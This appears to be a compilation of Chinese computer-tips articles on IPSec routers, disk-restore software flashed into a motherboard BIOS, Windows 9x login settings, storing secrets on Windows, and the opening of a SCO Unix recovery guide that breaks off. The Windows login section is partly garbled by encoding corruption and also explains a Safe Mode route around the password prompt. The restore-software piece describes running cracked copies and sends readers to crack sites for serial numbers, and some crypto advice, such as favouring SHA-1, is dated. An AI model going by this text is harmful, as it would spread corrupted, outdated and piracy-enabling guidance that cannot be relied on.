IPSec协议包括ESP（Encapsulating Security Payload）封装安全负载、AH（Authentication Header）报头验证协议及IKE（Internet Key Exchange）密钥管理协议等，其中AH协议能够提供无连接的完整性、数据发起验证及重放保护，ESP主要用于提供额外的加密保护，而IKE则主要提供安全加密算法与密钥协商。这些机制均独立于算法，协议的应用与具体加密算法的使用均可取决于用户及应用程序的安全性要求。因此，IPSec是一个开放性的安全标准框架，可以在一个公共IP网络上确保数据通信的可靠性和完整性，能够保障数据安全穿越公网而没有被侦听或窃改之虞，为实现通用安全策略所需的基于标准的解决方案提供了理想的应用框架。而且IPSec的部署极为简便，只需安全通道两端的路由器或主机支持IPSec协议即可，几乎无需对网络现有基础设施进行任何更动。IPSec的优势主要表现为可以对所有IP级的通信进行加密和认证，可以为IP提供基于加密的互操作性强、高质量的通信安全，所支持的安全服务包括存取控制、无连接的完整性、数据发起方认证和加密。这正是IPSec协议能够确保包括远程登录、客户机、服务器、电子邮件、文件传输及Web访问在内多种应用程序安全的主要依托。 
2、安全路由器安全在哪 
与常规路由器产品相比，安全路由器通常具有以下特征：采用IPSec协议；带有包过滤和代理协议的防火墙功能；能够隐藏内部网络拓扑结构；支持路由信息与IP数据包加密；能够实现身份鉴别、数据签名和数据完整性验证；具有灵活的密钥配置、支持集中式密钥与分布式密钥管理；可有效防止虚假路由信息的接收与路由器的非法接入；能够阻止非授权人员的入侵等。 
3.可与Internet连接，具有防火墙功能 
安全路由器可对指定服务器/客户机的数据报进行加密，可支持Telnet、E-mail、Ftp、WWW等，具有节点加密机的功能。支持身份鉴别，数字签名和数据完整性验证，而且安全路由器提供的硬件加密比软件加密有更好的传输效率与安全性。 
4.企业用户可以实现Intranet的安全加密 
安全路由器可通过广域网与普通路由器或与安全路由器互联构成安全VPN通道。由于安全路由器具有数据加密的功能，局域网上需要传输的数据在通过安全路由器向外发送时，安全路由器会根据一定的加密算法将数据加密，接收到该数据的目标端也要使用相同的算法才能把数据还原。因此，自安全路由器发送的加密IP数据报可以透明地穿越普通路由器和广域网，到达目标安全路由器进行解密，这期间传送的IP数据报均为密文，可有效防止敏感信息的泄露，构成跨越公网的Intranet。 
5.可以隐藏内部网络拓扑结构 
安全路由器能够对所有需要发送的IP包进行重新封装，在原来IP包上封装源和目的网关的IP地址。目的路由器接收到IP包时，先去掉IPSec增加的IP包头，然后根据IP包的源和目的地址，把该IP包发送到局域网上的目的主机上。这样，大型企业与分支机构间传输的数据即使在公网上被拦截，拦截者也无法通过IP包获取公司内部网络IP地址，从而进一步了解内部网络拓扑结构。 
选择安全路由器的7点注意 
1. 可靠性与线路安全:可靠性主要体现在接口故障和网络流量增大两种情况下，为此，备份是路由器不可或缺的手段之一。当主接口出现故障时，备份接口应可以自动投入工作，保证网络的正常运行。当网络流量增大时，备份接口又可承当负载分担的任务。 
2. 身份认证:路由器中的身份认证主要包括访问路由器时的身份认证、对端路由器的身份认证和路由信息的身份认证。 
3. 访问控制:对于路由器的访问控制，需要进行口令的分级保护。有基于IP地址的访问控制和基于用户的访问控制。 
4. 信息隐藏:与对端通信时，不一定需要用真实身份，通过地址转换，可以隐藏网内地址。除了由内部网络首先发起的连接，网外用户不能通过地址转换直接访问网内资源。 
5. 数据加密。 
6. 攻击探测和防范。 
7. 安全管理。 
硬盘数据保护以及还原精灵实战经验
一、软件系统的保护与还原
　　长期以来，学校机房、网吧等人员流动大，机器很多的场所，系统管理员的工作都非常烦琐，经常要重新安装系统、查杀病毒等。如何对硬盘中现有的操作系统和软件进行保护和还原就成了一个课题。
　　系统的保护和还原的方法从原理上来说主要分三类，一是保护，二是还原，三称为虚拟还原。
1.系统保护
　　系统保护，就是防止硬盘的重要信息被破坏，防止注册表改写和文件I/O操作等。用户被置于一个预先设置好的环境中，只能干此软件系统允许你干的事情。相对而言，这种方法对用户的约束太多，局限很大，对操作系统进程的干预也比较多，运行效率有一定影响。基于这种思路的软件代表有：美萍、网管大师、方竹等等。另外，通过手工修改注册表隐藏一些系统功能也属于这种方法。
　　系统保护，好比筑堤抗洪，“千里之堤，毁于蚁穴”，系统漏洞可谓防不胜防，事实上水平高点的用户都有办法饶过它的防护。另外，操作系统升级带来系统内部一些功能变化，这些软件也必须做相应修改，很被动。总的来说，这类软件从思路来说是一种被动防御的姿态，效果不会太理想。
　　系统保护只是对一些操作进行了限制，硬盘上的数据是动态变化的，它不能根据需要恢复到某一个时点的系统内容。
2.系统还原
　　系统还原，就是预先将系统内容做好全部或部分备份，当系统崩溃或者混乱需要重新安装的时候，将原来的备份进行恢复，将系统内容还原到备份那个时点的内容。这种方法不干预用户的操作，不干扰系统进程。基于还原最简单也最原始的方法是用一个同样大的硬盘一比一地将系统克隆或拷贝下来。更好一点的方法是将系统分区（一般是C盘）用GHOST或WINIMAGE等做个镜像，保存到另外的硬盘或分区上。
　　系统还原比较于系统保护，虽然有诸多优点，但它的缺点也很明显：需要占用很大硬盘空间，需要大量的还原时间。这些缺点实际上阻碍了它在实际工作中的应用范围，除了家庭用户和一些重要部门对重要数据用这个方法以外，学校和网吧等极少采用这种“笨”办法。
　　系统还原的特点是可以根据需要将系统还原到备份那个时点的内容。
3.虚拟还原
　　虚拟还原的工作原理实际上是基于系统保护的，但它的保护做在系统的最底层，先于操作系统，类似于引导型病毒（A型病毒）。它对系统进程有一定干扰，但是这个干扰几乎可以不被察觉。它不干预用户的任何操作，对普通用户来说，可以当它是透明的——根本不存在。
　　虚拟还原的工作方式又类似于系统还原，可以在需要的时候将系统进行“备份”，这个备份的速度非常快，最多十几秒就可以完成。它需要占用少量硬盘空间，占用率低于数据量的千分之一。同时它的还原速度也是惊人的，同样最多需要十几秒种。
　　正由于虚拟还原同时具有系统保护和系统还原的优点，又尽可能避免了它们的一些重要缺点，所以基于虚拟还原方式的软件越来越受到用户青睐。这些软件的代表有：还原精灵，虚拟还原，硬盘还原卡（其实是做在硬件上的软件，主要为了防止盗版）等。
　　虚拟还原的保护看上去相当神奇，如果按系统还原的工作原理来理解，从硬盘占用到还原速度绝对不可思议。它的保护原理在下一节里面再和大家一起分析。
二、虚拟还原的工作原理探讨
　　由于本人不认识这些虚拟还原的软件作者，没有机会跟他们请教，所以以下关于其工作原理的探讨都是基于雨人的猜想和臆测，你如果对原理不感兴趣，完全可以跳过这个部分。
1.文件存储分配原理
　　我们知道，硬盘上最重要的数据区除了BOOT（引导区）外，是ROOT（根目录）和FAT（文件分配表），ROOT里面记录的是文件或子目录的属性、尺寸、日期以及它的起始簇（软盘里面是扇区）。FAT表里面记录的是每个簇的使用分配情况。
　　 正常情况下，当我们向硬盘里面添加一个新文件，OS（操作系统）首先在ROOT里面将文件属性等填进去，在FAT表里面按一定算法找到一个空簇，将它标记为被该文件占用后，在ROOT里面将这个簇做为起始簇记录进去，然后将文件内容写入这个簇。如果文件没有写完，系统再在FAT里找一个空簇，将其标记为占用，然后在前一个簇的最后做一个指针向这个新的簇，形成一个单链表，接着再在这个新的簇里面继续写内容。如此重复直到文件内容完全记录完毕。最后系统根据占用的总簇数计算出文件尺寸，取出当前时间写到ROOT里面。
　　当我们删除一个文件的时候，系统实际上并不到每个簇去清除内容，而只是把ROOT里面文件名的首字符换成&符号，就是标记这个文件为删除，然后延着链表在FAT表中将该文件占用的所有簇释放（标记为空），这样新的文件写入的时候就可以使用这些被释放的簇。
　　当我们改变一个文件的属性或名字的时候，系统实际只在ROOT里面做一点改动而已。
　　子目录下的文件稍微复杂一些，它们的目录信息不是记录在ROOT里面，而是在子目录所指的第一个簇，实际是个SUBROOT。
　　实际硬盘的存储还要复杂得多，比如它的FAT表还有个副表，用作容错处理。我们这里只是为了讨论虚拟还原的原理，就不做深入讨论，只是简单说明一下。
2.虚拟还原的保护原理
　　根据雨人的臆测，虚拟还原的软件是这样工作的：
　　它首先将ROOT、SUBROOT以及FAT表都做个备份。然后，软件将备份的数据以及它的工作参数（密码、自动还原时间等）一起保存在硬盘上。这些空间也同时保护起来。
　　当用户删除文件、改名、改文件属性的时候，系统按正常情况处理，还原软件不做任何干涉。因为这些操作只针对ROOT和FAT表，并不去动数据区的任何数据。而这两个表软件已经备份过，需要的时候完全可以恢复。
　　最复杂的是添加新文件的情况。为了保护原来的数据，还原软件不允许在已经保护的簇进行任何的覆盖操作，即使现在的FAT表里面标记是空的，还原软件通过对照备份的FAT表，只要这个簇在表里面，它就会要求OS（操作系统）去找一个新的簇。这样数据区的数据就不会被覆盖。
　　其实这样说起来简单，但是OS不会知道系统里面已经装了个RECOVERY（虚拟还原软件），所以它还会按同样的算法把同一个簇找出来。这样的话会形成死循环，无法工作下去。
　　换一种方法，如果RECOVERY在删除文件的时候也不释放FAT表，那么OS找新簇的时候自然避开了已经保护的簇，但是有新问题：我们在做SCANDISK的时候会报出很多丢失的簇。
　　或者，RECOVERY根本就象个病毒一样，把一个虚假的ROOT显示给我们看，让我们以为文件已经删除了，其实硬盘上的ROOT它什么也不动。这很象以前一个叫DIR2病毒干的那样。
　　其实我一直就觉得RECOVERY象个病毒一样在工作，至少安装以后，系统的ANTI VIRUS（反病毒功能）必须DISABLE，否则开机就报警，无法工作。
　　当我们要恢复数据的时候，实际上相当简单，RECOVERY把备份的ROOT、SUBROOT以及FAT表全部恢复掉即可。这一点点内容，恢复起来自然神速。
　　我们无须深入了解RECOVERY到底是怎样去与OS协同工作的，不同的RECOVERY软件采用的方法可能都不尽相同，对系统工作的干扰程度也不尽相同。我们只要明白它确实是用系统保护的方式在工作，而且是保存了很少量的数据，能快速恢复被保护的内容，这就够了。
3.一点说明
　　前两节的内容讲原理比较多些，也比较枯燥，估计很多朋友都不愿意看下去。实在是有太多朋友包括雨人公司的技术人员一直在问这个问题：RECOVERY到底是怎样工作的？所以不厌其烦地写了那么多。
　　另外，保护方式的分类是雨人拍拍脑袋想出来的，没有参考过权威的著述，也许有点荒谬 。同样，硬盘的工作原理也只是雨人在很早前学过，脑袋里面还有点残留印象，写的时候也没去查有关资料，完全是看着天花板回忆着写的，谬误之处在所难免。希望大家领会精神即可。如能不吝指正，不胜感激！
三、虚拟还原软件介绍
　　其实，我用得最多的软件只是一个：Recovery Genius(还原精灵)，不过我分别研究过它的三个版本，算是有一点心得。另外一个名叫“虚拟还原”的软件，在一个朋友那里试用了一下，和Recovery Genius大同小异，没有仔细比较。至于硬盘还原卡，我觉得就象当年的汉卡、防病毒卡等，是一个特定时期的特定的产物，软件只能做成硬件，才能卖得有声有色，才能买得有名有目。
1.光盘版Recovery Genius
　　我拿到手的第一个版本是张光盘，安装的时候需要输入序列号。是通过光盘启动来安装的。整个650M的光盘只有中间有非常少的一点点内容，实在是巨大浪费（浪费我的CD-R碟片）。这个光盘实际是加过密的，上面一个重要的文件Boot.img的文件尺寸有1.8G之大（假的！）。但是在我用的Nero5.5.0.4下面，这个防护脆弱不堪，简单地就COPY过来了。只是后来我想把光盘上有用的东西拿出来的时候，才发现它在文件尺寸上动过手脚。我当时就想，Recovery Genius做得象个病毒一样小，它有必要用那么大的一张光盘来做载体吗？这个光盘上那些东西实际都是无用的，只有它的引导部分真正有用。
　　因此，我用Nero将光盘做了个镜像文件（也可以用WinImage等来做），然后用Cdmage将它读出来，将它的BOOTUP部分分离出来，是个1.44m启动软盘的镜像。最后将分离出来的IMG文件用WinImage写到一张软盘上，成功地将Recovery Genius改成了软盘版。
　　仔细看看这张软盘，整张盘上除了一个Command.com之外，空空如也，剩余空间有1.3M多，几乎就是张空盘。软件也只有在启动的时候才能安装，不用说，所有的东西还是在Boot扇区里面 —— 真是越看越象病毒！
　　如果朋友们对这张软盘有兴趣，什么时候我找个空间把这个镜像上传上去供大家下载。序列号就不提供了，现在的Crack站点那么多，真有兴趣的朋友自己找找应该能找到。
　　这个版本是简体中文的，安装起来很简单。要提醒大家的是，首先，安装之前应该整理硬盘，这样可以将软件对系统进程的干扰降到最低。太乱的硬盘在安装的时候甚至会出错。其次，BIOS里面的Anti Virus或者叫Virus Waring之类的防病毒选项一定要关掉，否则机器启动不起来，一直报警。
　　另外，轻易不要将其中“禁止软盘启动”选中。刚开始用这个软件的时候，我因为没有注意BIOS病毒防护的问题，机器启动不起来，以为安装失败了，而当时我恰好把“禁止软盘启动”选中了。为了下掉这个“失败”的软件，我用软驱、光驱都无法启动系统，接一个本可以启动的硬盘在前面同样不能启动！（是不是很象当年KV300中的逻辑炸弹？）最后雨人使出浑身解数，用了相当多复杂的手段终于把硬盘“救活”了。我的担心是如果系统真的出问题，一般的爱好者几乎无法自救。
　　软件参数设置是在开机时，喇叭“嘟嘟”响两声的时候按Ctrl-Home，输入密码后就可以进入设置。
2.硬盘版Recovery Genius
　　这个版本有2.2M左右大小，是繁体中文版本，在Soft.km169.net可以Down（不过好象没有Crack），版本号是5.0，也是我见过的功能最完善的虚拟还原软件。我拿到手的是个Crack过的版本，序列号乱输就可以用。
　　这个版比前面说的光盘版多了一些功能，在任务栏上多了一个图标，显示保护空间在硬盘上的占用情况。同时，可以点击图标直接在WIN9X里面设置各种参数，这样更加方便。当然也可以象光盘版本一样，在开机时按Ctrl-Home进去设置。
　　仔细看，这个Recovery还多了CMOS自动恢复的功能，确实想得比较周到。不过我觉得CMOS与硬件密切相关，不是任何选项都可以通过一个通用程序来调节的。CMOS最好的保护还是设置密码。这样对付一般水平的Cracker是足够了。
3.BIOS版Recovery Genius
　　捷波（JetWay）的815EP主板首先推出了整合在BIOS里面的Recovery Genius，在网上造成了一定轰动效应。很多朋友都研究了怎样将这个Recovery提取出来，整合到其他主板里面。
　　雨人按照一些网站上的指导，简单地就把手边这片大众的815EP主板武装了起来。唯一的麻烦只是在于版本的选择让人伤点脑筋，找到一个可以用的正式版花了我很多时间。按一些网站上介绍的拿到的只是一个Test Version(测试版)，而去JetWay的网站上下来的中文R01版和英文正式版都经过了技术处理，只能用在JetWay的主板上。
　　根据我的猜测，这个版本实际是将硬件版（硬盘还原卡）的内容做到了BIOS里面。而所谓硬盘还原卡，我想它的内容也只是有一个BIOS芯片，软件都写在它的BIOS里面了。这个猜测还有点依据是这个版本的Recovery在用CBROM写进主板BIOS的时候，是用的ISA选项，证明它是个ISA的插卡的BIOS，只不过它把检测硬件是否存在的部分PASS掉了。
　　四、将Recovery Genius写入BIOS
　　以大众(FIC)815EP主板FIC-FS15为例说明。其他主板也可以参考用同样的方法DIY。
1.准备软件
　　首先，在C盘根目录下建立一个叫BIOS的子目录，备用。
　　大众FIC的用户可以安装主板光盘所带的LogoGenie这个软件，然后在软件所在目录（缺省目录是C:\Program Files\FIC\LogoGenie）下找到BMPSIZE.EXE这个文件，然后将这个文件拷贝到C:BIOS下，将它改名为CBROM.EXE，实际上这个软件是CBROM V2.07。再到这个目录的下一级目录(C:\Program Files\FIC\LogoGenie\Utility)下找到FLASH.EXE，也将它拷贝到C:\BIOS子目录下，这个软件实际是AWDFlash V7.97。
　　也可以在INTERNET上下载CBROM和AWDFLASH这两个文件，只要CBROM版本不低于2.07，AWDFlash版本不低于7.3都可以。
　　2.获取BIOS文件
　　首先将主板的BIOS保存下来。在纯DOS下，CD\BIOS，运行FLASH.EXE，回一次车，屏幕下方出现Do You Want To Save Bios (Y/N)的时候，按Y，然后输入文件名字，比如FS15.BIN再回车。这样在C:\BIOS下生成了一个新文件FS15.BIN，这个就是当前主板的BIOS。
　　 然后到INTERNET上拉JETWAY的BIOS文件，在WWW.MYDRIVERS.COM下，JETWAY的BIOS有很多，必须找2001年5月份的那个版本。更早的是测试版，最新的做过处理，不能用在其他主板。下载地址：
　　http://file2.mydrivers.com/bios/618ASA06.zip
　　将下载的618asa06.zip文件解开，其中的618asa06.bin拷贝到C:\BIOS目录下。
3.进一步处理
　　首先看看现在主板的情况，键入命令：CBBOM FS15.BIN /D，可以看到如下内容：
CBROM V2.07 (C)Award Software 2000 All Rights Reserved. 
　　　　　　　********　　　FS15.bin BIOS component ******** 
No. Item-Name　　　　 Original-Size　 Compressed-Size Original-File-Name
===============================================================================
　0. System BIOS　　　 20000h(128.00K) 1472Ch(81.79K)　3slap.BIN
　1. XGROUP CODE　　　 0C090h(48.14K)　0831Dh(32.78K)　awardext.rom
　2. CPU micro code　　01800h(6.00K)　 00FE5h(3.97K)　 CPUCODE.BIN
　3. ACPI table　　　　03473h(13.11K)　014A4h(5.16K)　 ACPITBL.BIN
　4. EPA pattern　　　 0168Ch(5.64K)　 002AAh(0.67K)　 AwardBmp.bmp
　5. GROUP ROM[ 0]　　 01DE0h(7.47K)　 00EFCh(3.75K)　 _EN_CODE.BIN
　6. PCI driver[A]　　 08000h(32.00K)　04E3Eh(19.56K)　k:addromNCR400.rom
　7. LOGO BitMap　　　 4B30Ch(300.76K) 041E5h(16.47K)　FIC_1st2.bmp 
　Total compress code space　= 34000h(208.00K)
　Total compressed code size = 2909Bh(164.15K)
　Remain compress code space = 0AF65h(43.85K) 
　　　　　　　　　　　　　** Micro Code Information **
Update ID　CPUID　|　Update ID　CPUID　|　Update ID　CPUID　|　Update ID　CPUID
------------------+--------------------+--------------------+------------------
PPGA　 03　 0665　|　PPGA　 11　 0681　|　PPGA　 10　 0683　|　PPGA　 08　 0686 
　　注意其中Remain compress code space这一行，我们看到剩余的空间是43.85K。 
　　然后看看JETWAY的BIOS。键入命令CBROM 618asa06.bin /D 
　　　　　　　******** 618asa06.bin BIOS component ******** 
No. Item-Name　　　　 Original-Size　 Compressed-Size Original-File-Name
================================================================================
　0. System BIOS　　　 20000h(128.00K) 14FB1h(83.92K)　628ASL06.BIN
　1. XGROUP CODE　　　 0BD80h(47.38K)　08374h(32.86K)　awardext.rom
　2. CPU micro code　　02800h(10.00K)　01782h(5.88K)　 CPUCODE.BIN
　3. ACPI table　　　　02EB6h(11.68K)　01202h(4.50K)　 ACPITBL.BIN
　4. EPA pattern　　　 0168Ch(5.64K)　 002AAh(0.67K)　 AwardBmp.bmp
　5. GROUP ROM[ 0]　　 01EE0h(7.72K)　 00F69h(3.85K)　 _EN_CODE.BIN
　6. NNOPROM　　　　　 0127Fh(4.62K)　 00BF3h(2.99K)　 NNOPROM.BIN
　7. ROS ROM　　　　　 12AF0h(74.73K)　0699Bh(26.40K)　ROS.BIN
　8. ISA ROM[1]　　　　09800h(38.00K)　092C8h(36.70K)　STDE.DAT
　9. VRS ROM　　　　　 02280h(8.62K)　 014BBh(5.18K)　 ANTI_VIR.BIN 
　Total compress code space　= 35000h(212.00K)
　Total compressed code size = 32BCDh(202.95K)
　Remain compress code space = 02433h(9.05K) 
　　　　　　　　　　　　　** Micro Code Information **
Update ID　CPUID　|　Update ID　CPUID　|　Update ID　CPUID　|　Update ID　CPUID
------------------+--------------------+--------------------+-------------------
PPGA　 03　 0665　|　PPGA　 14　 0681　|　PPGA　 10　 0683　|　PPGA　 08　 0686
PPGA　 01　 068A　|　PPGA　 04　 06B0　| 

　　我们要的Recovery Genius实际就是第8项：STDE.DAT，可以看到文件的原始大小是38K，压缩后占36.7K。因此，FS15主板剩余的空间是足够的。
　　用命令：CBROM 618ASA06.BIN /ISA EXTRACT将STDE.DAT拷贝出来。
CBROM V2.07 (C)Award Software 2000 All Rights Reserved.
ISA ROM - - - [1] : STDE.DAT
Enter an extract file Name: (STDE.DAT)
　　这个时候回车就将在C:\BIOS下生成一个新文件STDE.DAT
　　如果你的主板空间不够，最简单的方法可以将开机的LOGO画面去掉，用下面的命令：
　　CBROM FS15.BIN /LOGO RELEASE
　　如果空间还不够，可以试着将PCI项去掉，只要把上面命令中的/LOGO换成/PCI就可以。不过下掉这个项目，主板功能是否正常就不敢保证了。 
4.在BIOS文件中加入Recovery Genius
　　命令：CBROM FS15.BIN /ISA STDE.DAT
　　出现：
CBROM V2.07 (C)Award Software 2000 All Rights Reserved.
Adding stde.dat .... 96.5%
　　表明成功地加入了文件，出现其他提示都可能有错误（当然如果你英语很好都能看懂就不用我说了），出现错误千万不要再执行下面一步，否则你的机器可能再也点不亮了。 
5.将新的BIOS写回主板
　　 命令：Flash FS15.BIN /SN /PY
　　 执行完毕重新启动系统就可以看到在检测完DMI后有一行提示：
Press Ctrl-R to Enter Recovery Genius
　　 表明Recovery Genius已经成功写入BIOS 
6.一点说明
　　上面的说明全部是基于大众（FIC）主板，更多照顾一点使用FIC主板的一般水平的朋友，主要是因为云南绝大多数使用大众板的朋友都为雨人同志解决衣食住行问题做出过贡献，所谓知恩图报。
　　如果你使用的是其他品牌的主板，只要是AWARD BIOS的，而且BIOS里面有足够的空间，都可以用上面的方法，举一反三，Do It Yourself。

把好你的Windows登录之门
　　大家都知道，Windows有一个登录密码，这一密码对于多数人来说形同虚设。即使你设了密码，别人只要一点取消就大摇大摆地进入你的系统了。 
£牐犚残砟阌邪旆ǎ盒薷囊桓瞿谌萑缦碌淖⒉岜砦募þ（注意大小写） 
[HKEY_LOCAL_MACHINE\Network\Logon] 
“MustBeValidated”=dword:00000001 
£牐犎缓蠼«其导入注册表，这样别人就不能绕过密码进入你的系统了。其实这也不是万全之策，有时它根本不起作用，还有可能你自己也被拒之门外。不信请听我道来： 
£牐燱indows的登录方式有三种：Windows登录、Microsoft友好登录、Microsoft网络用户。这三种登录方式各有特点，安全级别各不相同。 
£牐燱indows登录 
£牐犝馐荳indows刚安装完成后默认的登录方式，也是Windows中最不安全的登录方式，你前面对注册表的修改对它根本无效，不信，在出现“欢迎进入Windows”的登录窗口时，你只需单击取消，绝对畅通无阻。 
£牐燤icrosoft友好登录 
£牐犚ª以此种方式登录，需对控制面板中网络属性进行修改，在“配置”标签中选择“添加/客户/Microsoft厂商/Microsoft友好登录”，然后在主网络登录中选“Windows登录”或“Microsoft友好登录”，确定后重新启动计算机即可，开机登录窗口里面列出了该计算机上的所有用户，登录时先选择你的用户名，然后在密码框中输入口令单击“确定”即可。只要你对注册表作了如上修改，想单击“取消”绕过口令就行不通了。这种方法比较安全。 
£牐燤icrosoft网络用户 
£牐犚ª以此种方式登录，需对控制面板中网络属性进行修改，在“配置”标签中选择“添加/客户/Microsoft厂商/ Microsoft网络用户”，然后在主网络登录中选择“Windows网络用户”，确定后重新启动计算机即可。不过进行这步操作前，请注意：你的电脑必须接入某个Windows NT网络，该服务器必须正在运行，且你必须是该NT服务器上一个合法的用户，然后在出现登录网络对话框时输入你在服务器上的用户名、口令以及服务器的域名。最后确定方可顺利进入Windows，否则你也会被拒之门外。 
£牐牪还ý，进入Windows 的办法还是有的，重新启动计算机，按F8键，选择以安全模式进入Windows，将前面要注册表中建立的MustBeValidated的键值改为0后重启，这时就可单击“取消”绕过口令了。 
£牐犃私饬艘陨先ý种登录方式，你应该知道如何为你的Windows设置一道铜墙铁壁啦。若哪位老兄能在Windows登录方式下也能拒绝“芝麻开门”，可要拿出来给大家共享哟！ 
在Windows中存储秘密数据
有一句关于保守秘密的格言：“如果三个人可以保守一个秘密的话，那么其中两人一定是死人。”本文就将讲述计算机系统中的秘密数据处理问题。 
　　开发人员经常问我，在建立安全系统的时候，如何才能安全地存储秘密信息？秘密信息包括只能有一个或多个合法计算机、用户或应用程序知道的数据，比如口令、对其它数据进行解密的关键字等等。本文就介绍解决这种问题的方法，涵盖了一些将秘密存储在不同的Windows平台上的最好方法。 
有时候你并不需要存储秘密 
　　如果你存储一个秘密信息的目的只是为了验证另一个实体是否也知道这个秘密信息，那么你可能就不需要存储这个秘密信息本身。反之，你可以存储一个“验证符”，它通常就是这个秘密信息的hash数值。例如，如果应用程序需要验证一个用户的口令值，就可以将用户输入的秘密信息的hash数值与存储秘密信息的hash数值做比较。这样，应用程序并没有存储秘密信息本身，从而引出的风险也要少些：即使攻击者闯入了系统，他们也无法恢复秘密信息本身。 
　　为了给攻击者带来更多困难，你还可以给hash数值加点“盐”。“盐”是一个随即数，将它加到hash数值上以阻止预先计算好的字典式攻击，这样想要恢复原始的秘密信息就非常困难。“盐”与hash数值存储在一起。选择hash函数是一个重要决定，而且一定要使用密码性很强的hash函数，这样的hash函数已经被证明没有冲突的可能，或者是这种可能性相当低。换句话说就是，创建两个能计算出同一hash数值的数据是行不通的。现在最常使用的hash函数是SHA-1。MD5已经有些过时了，因为在其算法中有一些小小的弱点。 
　　现在来看看存储秘密信息的hash数值以及确认秘密信息所需要的步骤： 
　　1、存储加过“盐”的hash数值 
确定你希望保护的秘密信息。例如：一个用户口令。 
使用CryptGenRandom()函数生成一个随机的128位数。这就是“盐”。 
在秘密信息上运行一个hash函数[使用CryptCreateHash()和CryptHashData()]。 
将盐与hash数值相加[使用CryptHashData()]。 
存储盐和hash数值。 
　　2、验证用户知道这个秘密信息 
从用户处取得这个秘密信息。 
在秘密信息上运行一个hash函数[使用CryptCreateHash()和CryptHashData()]。 
从存储的位置取得hash数值和盐。 
将盐添加到hash数值上[使用CryptHashData()]。 
比较这两个加了盐的数值，如果它们相同，那么说明用户知道这个秘密信息。 
　　你能看到，不用存储秘密信息就能解决问题了，而且这样比存储秘密信息还好。但是有时也必须要存储秘密信息。现在来看看存储秘密信息的一个安全方法。 
存储秘密信息的最安全方法 
　　存储和保护秘密信息的最安全方法是从用户那里获取一个输入，这个输入可以作为对被保护对象进行加密和解密的关键字。换句话说就是，秘密信息是由保存在用户头脑中的数据保护的。 
　　但是，按照这种方法保存秘密信息对于大多数用户而言经常会变得没有用。你让他们记住的信息条目（口令数）越多，他们就越有可能一遍又一遍地使用同一个口令，这样就降低了系统的安全性和可用性，从而增加了复杂性。 
　　现在让我们将注意力转移到更为复杂的问题上：不提示用户定义关键字而存储秘密信息。 
最简单的情况：Windows2000 
　　在Windows2000上存储秘密信息是很简单的。要存储一个登录用户的数据时，可以使用数据保护APIs (DPAPI)、CryptProtectData()和CryptUnprotectData()。这些函数使用从用户的口令中衍生出来的一个关键字对数据进行加密/解密。只有拥有登录信用的用户才能对数据进行破解，所谓的登录信用要与那些加密数据相匹配。另外，只有在对数据进行加密的计算机上才能进行解密。但是一个拥有漫游特性的用户可以从网络上的另一个计算机对数据进行解密。CryptProtectData()还向加密的数据增加了一个键入的完整性检查，称为MAC或信息证明代码，目的是为了防止数据遭到破坏。 
　　要为一个系统组件或服务存储数据时，你也可以使用LSA秘密信息[LsaStorePrivateData()和LsaRetrievePrivateData()]。能够使用LSA秘密信息的服务必须是存储了特地服务的秘密信息，而不是特定于用户的或每个用户的秘密信息。这是因为LSA只能为每个系统存储4,096个秘密信息。在这4,096个秘密信息中，系统预留了一半供自己使用。 
一个比较简单的情况：Windows NT 4 
　　Windows NT 4没有DPAPI，但是它有 CryptoAPI 和访问控制列表ACLs。调用CryptGenRandom()得到一个关键字，然后用这个关键字对你希望保护的数据进行加密，将这个关键字存储在一个可以被列入访问控制列表的资源中（如注册表），并在资源上定义一个ACL－这个ACL只允许你的应用程序读取它。一个典型的ACL只包含“创建者/所有者”的完全控制权限和“管理员”的完全控制权限。如果你还不放心，就在资源上再放置一个审核用的ACE(SACL)。 
　　你还可以使用LSA秘密信息[LsaStorePrivateData()和 LsaRetrievePrivateData()]，就象前面Windows2000部分所讨论的那样。 
　　关于LSA秘密信息的一个注解：如果管理员对计算机有物理访问权的话，他可以查看用LSA保护的秘密信息，查看时可以使用BindView的LSADump2.exe。
其他的Windows家族 
　　Windows 95、Windows 98、Windows ME和Windows CE 3.0中都有CryptoAPI形式的内置密码功能，但是它们都没有ACL，因而它们也都没有识别的概念。在注册表或文件等资源中保存秘密数据很容易，但是应该把对数据加密时用的关键字存储在哪里呢？也存储在注册表中吗？你又如何使之安全呢？ 
　　这是一个困难的问题。在试图解决它之前，你应该了解一些事情： 
　　1、你可以将秘密信息就隐藏在这些平台上，但是这会比隐藏在Windows NT 4或Windows2000上要容易发现。简单地说，如果被保护的数据是高风险的（如医学数据），那么就要考虑使用Windows2000，除非你从一个用户或一个外部来源那里获取了对数据加密或解密的关键字。 
　　2、使用这些平台时，可以调用CryptGenRandom()来得到一个关键字。然后，你可以把这个关键字存储在注册表中，并从物理设备上的某些内容中得出一个关键字，如卷名、设备名、视频卡名等等，然后用这个关键字与第一个关键字再进行加密。我敢打赌你现在希望Intel将Pentium III的系列号一起装箱运来了，是不是？代码可以读取“设备”信息来得到解开注册表关键字的关键字。当然，如果这些改变了，那么数据也就丢失了。 
　　其实这些中没有一个是真正安全的，但是对于你试图保护的数据来说，它也许足够安全了，认识到这一点很重要。一定要提示用户，应用程序是尽可能努力地存储秘密信息的。 
　　不管你所工作的是哪种平台，都应该使用一切可用的资源。要利用好操作系统。如果你的应用程序在所有Windows平台(Windows 2000、WinNT、Win9x和WinCE)上都能工作，那么就应使用最合适的操作系统。 
对秘密信息进行编码 
　　在代码中处理秘密信息时，你应该将其停留在明码（也就是非密码）中的时间减到最少，这样就会降低秘密信息泄露到页面文件中的风险。一旦在代码中使用了秘密信息，就应假数据覆盖缓冲器，使用的语句是memset()。 关于如何最好地“擦洗掉”未使用的数据有许多理论，但是以下这个C/C++ 代码的片段就足够了： 
　　void ScrubBlob(void *b, DWORD cb) { 
　　for (int i=0; i < 7; i++) { 
　　memset(b,0xFF,cb); // all 1's 
　　memset(b,0x00,cb); // all 0's 
　　memset(b,0xAA,cb); // 10101010 
　　memset(b,0x55,cb); // 01010101 
　　} 
　　ZeroMemory(b,cb); 
　　} 
最后一个技巧 
　　如果应用程序中包含测试例程代码，那么一定不要采取默认方式最后安装它们。多年以来，许多Internet上的系统都因其测试例程而容易遭受攻击，因为那些被默认包含的测试应用程序本身就有许多弱点。
Unix 操作系统常见故障恢复技巧
SCO Unix 操作系统是一个多用户、多任务的操作系统，在日常的系统维护中，正确处理突发的灾难故障（如不能启动或不能登录等），保证数据的完整可靠，是系统管理员应该掌握的一种技能。本文介绍有关该系统的一些常见故障的恢复技巧。 
应急引导盘的制作 
在系统配置完成后，创建boot/root应急引导盘。下面以SCO OpenServer 5.0为例，介绍应急引导盘的制作步骤： 
● 以超级用户root 注册； 
